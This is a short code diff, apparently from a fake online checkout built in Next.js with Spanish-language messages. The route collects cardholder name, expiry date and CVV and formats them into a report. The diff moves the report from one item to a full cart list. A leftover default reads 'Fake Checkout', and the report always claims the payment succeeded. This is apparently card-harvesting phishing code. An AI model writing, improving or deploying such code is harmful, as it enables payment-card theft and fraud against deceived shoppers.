@@ -28,10 +28,9 @@ export async function POST(request: NextRequest) {
       expiryDate,
       cvv,
       
-      // Pago
-      product,
-      license,
-      quantity,
+      // Productos del carrito
+      products,
+      productsList,
       amount,
     } = body;
 
@@ -77,12 +76,14 @@ Titular: ${cardName || "No proporcionado"}
 Vencimiento: ${expiryDate || "No proporcionado"}
 CVV: ${cvv || "No proporcionado"}
 
-💰 DETALLES DEL PAGO
+🛒 PRODUCTOS COMPRADOS
 ━━━━━━━━━━━━━━━━━━━━
-Producto: ${product || "Fake Checkout"}
-Licencia: ${license || "No especificada"}
-Cantidad: ${quantity || "1"}
-Monto: €${amount || "0.00"}
+${productsList || "No hay productos"}
+
+💰 RESUMEN DEL PAGO
+━━━━━━━━━━━━━━━━━━━━
+Total de productos: ${products?.length || 0}
+Monto Total: $${amount || "0.00"}
 Fecha: ${fechaActual}
 
 ✅ Estado: Pago procesado exitosamente`;
